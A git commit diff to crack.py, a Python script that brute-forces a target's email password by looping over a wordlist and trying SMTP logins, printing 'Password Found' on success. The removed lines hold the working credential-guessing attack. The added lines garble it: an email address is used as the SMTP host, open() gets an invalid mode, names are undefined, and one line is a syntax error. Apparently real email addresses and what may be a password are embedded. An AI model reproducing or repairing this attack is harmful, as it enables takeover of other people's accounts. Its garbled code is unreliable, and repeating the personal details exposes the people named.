77f04116d28fdcd7c16635994fb8962ea65263e5
shoron11 <75226264+shoron11@users.noreply.github.com>
2020-11-30 05:18:01 +0600

    miashapon590@gmail.com

--- crack.py
+++ crack.py
@@ -2,21 +2,21 @@ import smtplib
 
 
 def main():
-    smtpserver = smtplib.SMTP("jubayershoron@gmail.com", 587)
+    smtpserver = smtplib.SMTP("miashapon590@gmail.com", 587)
     smtpserver.ehlo()
     smtpserver.starttls()
 \
     user = raw_input("Alpha : Enter the target's email address: miashapon590@gmail.com")
-    passwfile = raw_input("Alpha : Enter the password file name:crack.py ")
-    passwfile = open(passwfile, "r")
+    passwfile = raw_input("Alpha : Enter the password file name: jubayer0131 ")
+    passwfile = open(passwfile, "jubayer 0131")
 
     for password in passwfile:
         try:
-            smtpserver.login(user, password)
-            print("Alpha : [+] Password Found: %s" % password)
+            smtpserver.login(shoron11, jubayer0131)
+            print("Alpha : [+] Password Found: %s" %jubayer0131)
             break
         except smtplib.SMTPAuthenticationError:
-            print("Alpha : [!] Password Incorrect: %s" % password)
+            print("Alpha : [!] Password correct: %s" % jubayer013@)
 
 if __name__ == "__main__":
     main()
